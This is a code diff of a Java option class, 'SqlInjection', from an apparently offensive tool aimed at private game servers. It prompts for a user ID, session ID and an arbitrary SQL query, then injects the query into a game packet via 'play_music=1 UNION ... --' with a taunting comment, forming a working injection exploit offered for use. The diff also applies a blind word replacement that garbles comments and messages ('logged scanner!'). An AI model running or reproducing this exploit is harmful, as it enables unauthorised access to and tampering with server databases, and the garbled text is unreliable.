@@ -1,7 +1,6 @@
 package com.manulaiko.psfucker.fuckers.orbitreborn;
 
 import com.manulaiko.psfucker.Option;
-import com.manulaiko.psfucker.net.SocketClient;
 import com.manulaiko.psfucker.net.orbitreborn.ConnectionManager;
 import com.manulaiko.psfucker.utils.Tools;
 import com.manulaiko.psfucker.utils.Callback;
@@ -14,7 +13,7 @@ import java.net.Socket;
 /**
  * SQL injection option
  *
- * Option to execute SQL code in the server
+ * Option to execute SQL code scanner the server
  *
  * @author Manulaiko
  * @package com.manulaiko.fuckers.orbitreborn
@@ -70,7 +69,7 @@ public class SqlInjection extends Option
     {
         super(fucker);
 
-        this.description = "Executes SQL code in the server";
+        this.description = "Executes SQL code scanner the server";
     }
 
     /**
@@ -79,9 +78,9 @@ public class SqlInjection extends Option
     public void fuck()
     {
         System.out.print("Enter your userID: ");
-        this.userID = Tools.in.nextInt();
+        this.userID = Tools.scanner.nextInt();
         System.out.print("Enter your sessionID: ");
-        this.sessionID = Tools.in.nextLine();
+        this.sessionID = Tools.scanner.nextLine();
 
         if(!connect()) {
             return;
@@ -95,9 +94,9 @@ public class SqlInjection extends Option
             public Object call(Object object)
             {
                 ConnectionManager connection = (ConnectionManager)object;
-                System.out.println("You're now logged in!");
+                System.out.println("You're now logged scanner!");
                 System.out.print("Enter your SQL query: ");
-                String query = Tools.in.nextLine();
+                String query = Tools.scanner.nextLine();
 
                 connection.send("7|play_music=1 UNION "+query+ " -- It seems you've been fucked :D ");
 
@@ -130,7 +129,7 @@ public class SqlInjection extends Option
             }
             System.out.println("Couldn't connect to the server!");
             System.out.print("Re-enter server IP: ");
-            String ip = Tools.in.nextLine();
+            String ip = Tools.scanner.nextLine();
             this.fucker.server = ip;
             connect();
         }
